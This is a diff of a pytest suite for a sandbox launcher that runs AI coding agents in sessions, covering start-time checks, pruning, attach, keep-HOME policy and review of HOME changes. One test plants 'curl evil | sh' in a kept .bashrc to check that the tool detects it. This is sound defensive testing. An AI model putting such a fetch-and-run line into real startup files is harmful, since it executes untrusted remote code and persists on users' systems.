@@ -3,6 +3,7 @@ import importlib.util
 import json
 import os
 from pathlib import Path
+import re
 import signal
 import subprocess
 from unittest.mock import Mock
@@ -26,13 +27,18 @@ def isolated(tmp_path, monkeypatch):
     monkeypatch.setattr(m, "PROC", tmp_path / "proc")
     (tmp_path / "proc").mkdir()
     monkeypatch.setattr(m.sys.stdin, "isatty", lambda: False)
+    # A terminal that comes back from a session waits for nothing in these tests.
+    monkeypatch.setattr(m, "DETACH_GRACE", 0)
+    monkeypatch.setattr(m, "ENDING_WAIT", 0)
 
 
-def fake_process(tmp_path, pid, ppid, cmdline=b"python3\0", comm="python3"):
+def fake_process(tmp_path, pid, ppid, cmdline=b"python3\0", comm="python3", start=None):
     entry = tmp_path / "proc" / str(pid)
     entry.mkdir()
     (entry / "cmdline").write_bytes(cmdline)
-    (entry / "stat").write_text(f"{pid} ({comm}) S {ppid} 1 1 0 -1\n")
+    # The start time is field 22; without one the stat line ends early, as in the older fixtures.
+    tail = " 0" * 13 + f" {start}" if start is not None else ""
+    (entry / "stat").write_text(f"{pid} ({comm}) S {ppid} 1 1 0 -1{tail}\n")
 
 
 def make_session(name, backend="podman", pid=None, tmp_path=None, paused=False):
@@ -66,6 +72,7 @@ def test_start_new_session_launches_detached_supervisor(tmp_path, monkeypatch):
     def popen(cmd, **kwargs):
         launched.update(cmd=cmd, **kwargs)
         (m.session_dir("demo") / "tmux" / "attach.sock").touch()
+        fake_process(tmp_path, 4242, 1, start=987654)
         return Mock(pid=4242, poll=Mock(return_value=None))
     monkeypatch.setattr(m.subprocess, "Popen", popen)
     monkeypatch.setattr(m, "clear_stale_pod", Mock())
@@ -76,13 +83,15 @@ def test_start_new_session_launches_detached_supervisor(tmp_path, monkeypatch):
     cmd = launched["cmd"]
     assert cmd[cmd.index("--state-dir") + 1] == str(directory / "home")
     assert cmd[cmd.index("--tmux-socket-dir") + 1] == str(directory / "tmux")
-    assert cmd[cmd.index("--pod-name") + 1] == "agent-session-demo"
+    # Every run of a session has a run id (and pod) of its own; session.json says which is current.
+    pod = cmd[cmd.index("--pod-name") + 1]
+    assert re.fullmatch(r"agent-codex-[0-9a-f]{8}", pod) and m.load("demo")["run"] == pod[len("agent-"):]
     assert cmd[cmd.index("--") + 1:] == ["exec", "x"]
     assert "--session" not in cmd
     assert launched["start_new_session"] is True and launched["cwd"] == str(tmp_path)
     assert launched["stdin"] == subprocess.DEVNULL
     data = m.load("demo")
-    assert data["pid"] == 4242 and data["agent_args"] == ["exec", "x"]
+    assert data["pid"] == 4242 and data["pid_start"] == 987654 and data["agent_args"] == ["exec", "x"]
     for path in (directory, directory / "home", directory / "tmux"):
         assert path.stat().st_mode & 0o777 == 0o700
 
@@ -91,7 +100,7 @@ def test_start_refuses_running_and_resumes_stopped(scenario, tmp_path, monkeypat
     if scenario == "sad":
         make_session("busy", pid=77, tmp_path=tmp_path)
         a = m.launcher().parse_args(["codex", "--session", "busy"])
-        with pytest.raises(ValueError, match="attach with: sandbox-session attach busy"):
+        with pytest.raises(ValueError, match="attach with: sandbox-ai attach busy"):
             m.start(a, ["codex", "--session", "busy"])
     elif scenario == "edge":
         make_session("other")
@@ -211,6 +220,20 @@ def test_status(scenario, tmp_path):
         # A reused PID that runs something else is not the session.
         fake_process(tmp_path, 12, 1, b"vim\0")
         assert m.status("e", {**make_session("e"), "pid": 12}) == "stopped"
+
+
+def test_status_compares_the_start_time(scenario, tmp_path):
+    data = make_session("s")
+    fake_process(tmp_path, 20, 1, b"python3\0--tmux-socket-dir\0" + os.fsencode(str(m.session_dir("s") / "tmux"))
+                 + b"\0", start=5000)
+    if scenario == "happy":
+        assert m.status("s", {**data, "pid": 20, "pid_start": 5000}) == "running"
+    elif scenario == "sad":
+        # Same PID and command line, other start time: a later process (another run of this launcher).
+        assert m.status("s", {**data, "pid": 20, "pid_start": 4999}) == "stopped"
+    else:
+        # Written by an older version without a start time: the command line decides, as before.
+        assert m.status("s", {**data, "pid": 20}) == "running"
 
 
 def test_descendants_and_signal_tree(scenario, tmp_path, monkeypatch):
@@ -343,7 +366,8 @@ def test_delete(scenario, tmp_path):
 
 def test_session_name_validation(scenario):
     if scenario == "sad":
-        for name in ("../x", "a b", "", "x" * 41):
+        # An id is a name, perhaps with a -xxxx suffix (sessions.new_key): at most 48 characters.
+        for name in ("../x", "a b", "", "x" * 49, ".hidden", None):
             with pytest.raises(ValueError):
                 m.session_dir(name)
     else:
@@ -356,7 +380,7 @@ def test_list_and_cli(tmp_path, capsys):
     make_session("two", pid=90, tmp_path=tmp_path)
     assert m.cli(["list"]) == 0
     lines = capsys.readouterr().out.splitlines()
-    assert lines[0].split() == ["NAME", "AGENT", "BACKEND", "STATUS", "WORKSPACE", "CREATED"]
+    assert lines[0].split() == ["NAME", "AGENT", "BACKEND", "STATUS", "CREATED", "WORKSPACE"]
     assert lines[1].split()[:4] == ["one", "codex", "podman", "stopped"]
     assert lines[2].split()[:4] == ["two", "codex", "podman", "running"]
     with pytest.raises(SystemExit):
@@ -367,7 +391,7 @@ def test_wrapper_script_runs_isolated(tmp_path):
     env = {**os.environ, "XDG_STATE_HOME": str(tmp_path / "empty")}
     result = subprocess.run([str(ROOT / "sandbox-session"), "list"], capture_output=True, text=True, env=env)
     assert result.returncode == 0, result.stderr
-    assert result.stdout.split() == ["NAME", "AGENT", "BACKEND", "STATUS", "WORKSPACE", "CREATED"]
+    assert result.stdout.startswith("no sessions; start one with: sandbox-ai AGENT --session NAME")
     result = subprocess.run([str(ROOT / "sandbox-session"), "attach", "missing"], capture_output=True, text=True, env=env)
     assert result.returncode == 1 and "No session named missing" in result.stderr
 
@@ -544,7 +568,7 @@ def test_review_restart_never_repeats_prompts(agent, args, expected):
 
 
 def test_failed_first_start_leaves_no_directory(scenario, tmp_path, monkeypatch):
-    def fail(a, argv):
+    def fail(a, argv, key=None):
         if scenario != "sad":
             raise ValueError("image missing")
         m.save("x", {"agent": "codex"})  # saved before failing: kept as a stopped session
@@ -556,3 +580,362 @@ def test_failed_first_start_leaves_no_directory(scenario, tmp_path, monkeypatch)
     with pytest.raises(ValueError):
         m.start(a, ["codex", "--session", "x"])
     assert m.session_dir("x").exists() == (scenario != "happy")
+
+
+# --- every interactive start is a session --------------------------------------------------------------------
+
+
+def test_split_argv_drops_the_naming_options(scenario):
+    argv = {"happy": ["claude", "--name", "review", "--gui", "--project-name=shop"],
+            "sad": ["claude", "--name=x", "--session", "y"],
+            "edge": ["claude", "--gui", "--", "--name", "literal"]}[scenario]
+    expected = {"happy": (["--gui"], []), "sad": ([], []), "edge": (["--gui"], ["--name", "literal"])}[scenario]
+    assert m.split_argv(argv) == expected
+
+
+def test_start_of_an_interactive_start(scenario, tmp_path, monkeypatch):
+    """Not --session: a new session under the start's name; without a kept HOME no home/ and no --state-dir."""
+    launched = {}
+
+    def popen(cmd, **kwargs):
+        launched["cmd"] = cmd
+        key = cmd[cmd.index("--start-id") + 1]
+        (m.session_dir(key) / "tmux" / "attach.sock").touch()
+        return Mock(pid=4250, poll=Mock(return_value=None))
+    monkeypatch.setattr(m.subprocess, "Popen", popen)
+    monkeypatch.setattr(m, "clear_stale_pod", Mock())
+    monkeypatch.chdir(tmp_path)
+    argv = ["claude", "--workspace", "/srv/shop", "--name", "review"]
+    a = m.launcher().parse_args(argv)
+    a.start_name, a.keep_home = "review", scenario == "edge"
+    if scenario == "sad":
+        stopped_session("review", name="other")  # a renamed session holds the directory: another id is chosen
+    assert m.start(a, argv) == 0
+    key = launched["cmd"][launched["cmd"].index("--start-id") + 1]
+    data = m.load(key)
+    assert data["name"] == "review" and data["mode"] == "tmux" and "--name" not in data["options"]
+    assert data["keep"] is (scenario == "edge")
+    assert ("--state-dir" in launched["cmd"]) is (scenario == "edge")
+    assert (m.session_dir(key) / "home").is_dir() is (scenario == "edge")
+    if scenario == "sad":
+        assert key.startswith("review-") and len(key) == len("review-") + 4
+    else:
+        assert key == "review"
+    assert [e["event"] for e in m.starts().history("review")] == ["start"]
+
+
+def stopped_session(key, **fields):
+    """A stopped session KEY with FIELDS."""
+    name = key
+    directory = m.session_dir(name)
+    for path in (directory, directory / "tmux"):
+        path.mkdir(parents=True, exist_ok=True)
+    data = {"agent": "codex", "options": [], "agent_args": [], "backend": "podman", "workspace": "/srv/w", "cwd": "/",
+            "created": "2026-11-01T00:00:00Z", "pod": f"agent-session-{name}", **fields}
+    m.save(name, data)
+    return data
+
+
+def test_start_refuses_a_name_taken_meanwhile(tmp_path, monkeypatch):
+    a = m.launcher().parse_args(["claude"])
+    a.start_name = "busy"
+    stopped_session("busy")
+    monkeypatch.setattr(m, "new_key", lambda name: name)  # as if the directory came after the key was chosen
+    with pytest.raises(ValueError, match="was taken meanwhile"):
+        m.start(a, ["claude"])
+
+
+def test_keeps_home(scenario):
+    if scenario == "happy":
+        assert m.keeps_home({"keep": True})
+    elif scenario == "sad":
+        assert not m.keeps_home({"keep": False})
+    else:
+        assert m.keeps_home({})  # sessions of older versions always kept their HOME
+
+
+def test_relay_listening(scenario, tmp_path):
+    import socket
+    path = tmp_path / "attach.sock"
+    if scenario == "happy":
+        server = socket.socket(socket.AF_UNIX)
+        server.bind(str(path))
+        server.listen(1)
+        try:
+            assert m.relay_listening(path) is True
+        finally:
+            server.close()
+        assert m.relay_listening(path) is False  # the socket file stays, nobody listens
+    elif scenario == "sad":
+        assert m.relay_listening(path) is False
+        path.write_text("")
+        assert m.relay_listening(path) is False  # not a socket
+    else:
+        server = socket.socket(socket.AF_UNIX)
+        server.bind(str(tmp_path / "real.sock"))
+        server.listen(1)
+        path.symlink_to(tmp_path / "real.sock")  # planted by the sandbox: never followed
+        try:
+            assert m.relay_listening(path) is False
+        finally:
+            server.close()
+
+
+def test_exit_status(scenario):
+    data = stopped_session("e", run="claude-1")
+    path = m.session_dir("e") / "exit.json"
+    if scenario == "happy":
+        path.write_text(json.dumps({"run": "claude-1", "status": 3}))
+        assert m.exit_status("e", data) == 3
+    elif scenario == "sad":
+        assert m.exit_status("e", data) is None
+        path.write_text(json.dumps({"run": "claude-0", "status": 3}))  # an earlier run's
+        assert m.exit_status("e", data) is None
+    else:
+        path.write_text(json.dumps({"run": "claude-1", "status": True}))
+        assert m.exit_status("e", data) is None
+
+
+def test_prune(scenario, tmp_path):
+    if scenario == "happy":
+        stopped_session("gone", keep=False)
+        assert m.prune("gone") is True and not m.session_dir("gone").exists()
+        assert m.prune("gone") is False
+    elif scenario == "sad":
+        stopped_session("kept", keep=True)
+        assert m.prune("kept") is False and m.session_dir("kept").exists()
+    else:
+        directory = m.session_dir("live")
+        (directory / "tmux").mkdir(parents=True)
+        fake_process(tmp_path, 300, 1, b"python3\0--tmux-socket-dir\0" + os.fsencode(str(directory / "tmux")) + b"\0")
+        m.save("live", {"agent": "codex", "options": [], "keep": False, "pid": 300})
+        assert m.prune("live") is False  # still running
+
+
+def test_after_attach(scenario, tmp_path, monkeypatch, capsys):
+    data = stopped_session("t", keep=False, run="claude-1", pid=310)
+    if scenario == "happy":
+        # Ctrl-b d: the sandbox runs on, its relay listens.
+        monkeypatch.setattr(m, "alive", lambda name, d: True)
+        monkeypatch.setattr(m, "relay_listening", lambda path: True)
+        assert m.after_attach("t") == 0
+        assert "detached from t; it keeps running. Back: sandbox-ai attach t" in capsys.readouterr().err
+        assert m.session_dir("t").exists()
+    elif scenario == "sad":
+        # The agent ended: its status; a session without a kept HOME goes, its history stays.
+        (m.session_dir("t") / "exit.json").write_text(json.dumps({"run": "claude-1", "status": 7}))
+        assert m.after_attach("t") == 7
+        assert not m.session_dir("t").exists()
+    else:
+        # Ended, but the supervisor still cleans up after ENDING_WAIT.
+        monkeypatch.setattr(m, "alive", lambda name, d: True)
+        monkeypatch.setattr(m, "relay_listening", lambda path: False)
+        assert m.after_attach("t") == 0
+        assert "still cleaning up" in capsys.readouterr().err
+
+
+def test_resume_refuses_an_ended_start_without_home(tmp_path):
+    stopped_session("gone", keep=False)
+    with pytest.raises(ValueError, match="has ended and its HOME was discarded"):
+        m.resume("gone")
+    assert not m.session_dir("gone").exists()
+
+
+def test_signal_tree_can_spare_the_root(tmp_path, monkeypatch):
+    fake_process(tmp_path, 400, 1)
+    fake_process(tmp_path, 401, 400)
+    sent = []
+    monkeypatch.setattr(m.os, "kill", lambda pid, sig: sent.append(pid))
+    m.signal_tree(400, signal.SIGCONT, include_root=False)
+    assert sent == [401]
+
+
+# --- kept starts in the foreground (tasks) -------------------------------------------------------------------
+
+
+def foreground_args(tmp_path, name="task"):
+    a = m.launcher().parse_args(["codex", "--workspace", "/srv/app", "--name", name, "--no-tmux", "--", "exec", "x"])
+    a.start_name, a.start_key, a.run_id = name, name, "codex-1a2b3c4d"
+    return a
+
+
+def test_begin(scenario, tmp_path, monkeypatch):
+    monkeypatch.chdir(tmp_path)
+    a = foreground_args(tmp_path)
+    argv = ["codex", "--workspace", "/srv/app", "--name", "task", "--no-tmux", "--keep", "--", "exec", "x"]
+    if scenario == "sad":
+        stopped_session("task")
+        with pytest.raises(ValueError, match="was taken meanwhile"):
+            m.begin(a, argv)
+        return
+    if scenario == "edge":
+        a.backend = "bwrap"
+    m.begin(a, argv)
+    data = m.load("task")
+    assert data["mode"] == "foreground" and data["keep"] is True and data["pid"] == os.getpid()
+    assert data["options"] == ["--workspace", "/srv/app", "--no-tmux"] and data["agent_args"] == ["exec", "x"]
+    assert data["run"] == "codex-1a2b3c4d" and data["name"] == "task" and data["ready"] is True
+    assert data["pod"] == ("agent-codex-1a2b3c4d" if scenario == "happy" else None)
+    for path in (m.session_dir("task"), m.session_dir("task") / "home"):
+        assert path.stat().st_mode & 0o777 == 0o700
+
+
+def test_discard_unstarted(scenario, tmp_path, monkeypatch):
+    monkeypatch.chdir(tmp_path)
+    a = foreground_args(tmp_path)
+    m.begin(a, ["codex"])
+    if scenario == "happy":
+        m.discard_unstarted(a)  # refused or failed before it registered
+        assert not m.session_dir("task").exists()
+    elif scenario == "sad":
+        a.control_dir = tmp_path / "control"  # it ran: kept
+        m.discard_unstarted(a)
+        assert m.session_dir("task").exists()
+    else:
+        b = m.launcher().parse_args(["codex"])  # no kept start at all
+        m.discard_unstarted(b)
+        assert m.session_dir("task").exists()
+
+
+def test_alive_of_a_foreground_start(scenario, tmp_path):
+    data = {"mode": "foreground", "pid": 500, "pid_start": 77}
+    if scenario == "happy":
+        fake_process(tmp_path, 500, 1, b"python3\0-I\0/opt/sandbox/agent_sandbox.py\0codex\0", start=77)
+        assert m.alive("task", data) is True and m.foreground(data)
+    elif scenario == "sad":
+        fake_process(tmp_path, 500, 1, b"python3\0/opt/sandbox/agent_sandbox.py\0", start=78)  # a later process
+        assert m.alive("task", data) is False
+    else:
+        fake_process(tmp_path, 500, 1, b"vim\0", start=77)
+        assert m.alive("task", data) is False
+        assert m.alive("task", {**data, "pid_start": None}) is False  # never without the start time
+
+
+def test_foreground_start_pause_attach_and_rebirth(tmp_path, monkeypatch):
+    stopped_session("task", mode="foreground", keep=True, backend="bwrap", pid=510, pid_start=5,
+                    agent_args=["exec", "x"], run="codex-1")
+    fake_process(tmp_path, 510, 1, b"python3\0agent_sandbox.py\0", start=5)
+    tree = Mock()
+    monkeypatch.setattr(m, "signal_tree", tree)
+    assert m.status("task", m.load("task")) == "running"
+    with pytest.raises(ValueError, match="runs without tmux"):
+        m.attach("task")
+    assert m.pause("task") == 0 and m.resume("task") == 0
+    # The launcher holds a terminal: only what runs below it is frozen.
+    assert [c.kwargs for c in tree.call_args_list] == [{"include_root": False}, {"include_root": False}]
+    # Once it ended, resume brings it back as a session, continuing the task's conversation interactively.
+    (tmp_path / "proc" / "510" / "cmdline").write_bytes(b"vim\0")
+    launch = Mock(return_value=0)
+    monkeypatch.setattr(m, "launch", launch)
+    assert m.resume("task") == 0
+    assert launch.call_args.args[2] == ["resume", "--last"]
+
+
+def test_check_keep_policy(scenario, monkeypatch):
+    policy = {"happy": {}, "sad": {"version": 1, "forbid_keep": True}, "edge": {"version": 1, "forbid_keep": False}}
+    monkeypatch.setattr(m.launcher(), "load_policy", lambda path=None: policy[scenario])
+    if scenario == "sad":
+        with pytest.raises(ValueError, match="forbids using one \\(forbid_keep"):
+            m.check_keep_policy("web")
+        stopped_session("web", keep=True)
+        with pytest.raises(ValueError, match="forbid_keep"):
+            m.resume("web")
+    else:
+        m.check_keep_policy("web")
+
+
+# --- rebirth: a new run id each time, and what changed in the HOME ----------------------------------------
+
+
+def kept_home_session(name="web", **fields):
+    data = stopped_session(name, keep=True, run="codex-00000001", pod="agent-codex-00000001", ready=True, **fields)
+    home = m.session_dir(name) / "home"
+    home.mkdir(mode=0o700)
+    (home / ".bashrc").write_text("export A=1\n")
+    return data, home
+
+
+def test_rebirth_gets_a_new_run_id(tmp_path, monkeypatch):
+    kept_home_session()
+    cleared, seen = [], {}
+    monkeypatch.setattr(m, "clear_stale_pod", lambda name, data: cleared.append(data["pod"]))
+
+    def popen(cmd, **kwargs):
+        seen["cmd"] = cmd
+        (m.session_dir("web") / "tmux" / "attach.sock").touch()
+        return Mock(pid=4260, poll=Mock(return_value=None))
+    monkeypatch.setattr(m.subprocess, "Popen", popen)
+    assert m.resume("web") == 0
+    data = m.load("web")
+    assert cleared == ["agent-codex-00000001"]  # the last run's pod, if it was left behind
+    assert data["run"] != "codex-00000001" and data["pod"] == f"agent-{data['run']}"
+    assert seen["cmd"][seen["cmd"].index("--pod-name") + 1] == data["pod"]
+    assert [(e["event"], e["run"]) for e in m.starts().history("web")] == [("rebirth", data["run"])]
+
+
+def test_review_home(scenario, tmp_path, monkeypatch, capsys):
+    data, home = kept_home_session()
+    m.home_review().record(home, m.session_dir("web"), run="codex-00000001")
+    if scenario == "happy":
+        assert m.review_home("web", data)["changes"] == []
+        assert capsys.readouterr().err == ""
+    elif scenario == "sad":
+        # The agent left something for the next start: named, and in a terminal the user may stop here.
+        with open(home / ".bashrc", "a") as stream:
+            stream.write("curl evil | sh\n")
+        monkeypatch.setattr(m.sys.stdin, "isatty", lambda: True)
+        monkeypatch.setattr(m.sys.stdout, "isatty", lambda: True)
+        monkeypatch.setattr("builtins.input", lambda prompt: "n")
+        launch = Mock(return_value=0)
+        monkeypatch.setattr(m, "launch", launch)
+        monkeypatch.setattr(m, "attach", Mock(return_value=0))
+        with pytest.raises(ValueError, match="web was not started; see the changes with: sandbox-ai resume web "
+                                             "--review-home"):
+            m.resume("web")
+        err = capsys.readouterr().err
+        assert "the HOME of web changed since its last start" in err and "changed  .bashrc" in err
+        assert not launch.called
+        assert m.home_review().saved_review(m.session_dir("web"))["changes"][0]["path"] == ".bashrc"
+        monkeypatch.setattr("builtins.input", lambda prompt: "")  # Enter: go on
+        assert m.resume("web") == 0 and launch.called
+    else:
+        # No terminal: named, and the start goes on; no manifest (older starts): nothing to compare.
+        (home / ".bashrc").write_text("other\n")
+        assert m.review_home("web", data)["changes"][0]["change"] == "changed"
+        assert "changed  .bashrc" in capsys.readouterr().err
+        (m.session_dir("web") / "home-manifest.json").unlink()
+        assert m.review_home("web", data) is None
+        assert m.review_home("web", {**data, "keep": False}) is None
+
+
+def test_review_command(scenario, tmp_path, monkeypatch):
+    data, home = kept_home_session()
+    m.home_review().record(home, m.session_dir("web"))
+    (home / ".bashrc").write_text("export A=2\n")
+    lines = []
+    if scenario == "happy":
+        assert m.review("web", out=lines.append) == 0
+        assert "== changed .bashrc" in lines and "+export A=2" in lines
+    elif scenario == "sad":
+        stopped_session("plain", keep=False)
+        with pytest.raises(ValueError, match="keeps no HOME"):
+            m.review("plain")
+    else:
+        assert m.review("web", as_json=True, out=lines.append) == 0
+        found = json.loads("\n".join(lines))
+        assert found["pending"] is True and found["review"]["changes"][0]["path"] == ".bashrc"
+        assert "+export A=2" in found["review"]["changes"][0]["diff"]
+
+
+def test_delete_forgets_the_canaries_of_the_home(tmp_path, monkeypatch):
+    """A kept HOME keeps its canary files from run to run, recorded outside it; deleting the start forgets them."""
+    stopped_session("old", keep=True)
+    home = m.session_dir("old") / "home"
+    spec = importlib.util.spec_from_file_location("canary_for_sessions_test", ROOT / "sandbox/canary.py")
+    canary = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(canary)
+    record = canary.home_state(home)
+    record.parent.mkdir(parents=True, exist_ok=True)
+    record.write_text("{}")
+    assert m.delete("old", yes=True) == 0
+    assert not record.exists() and not m.session_dir("old").exists()
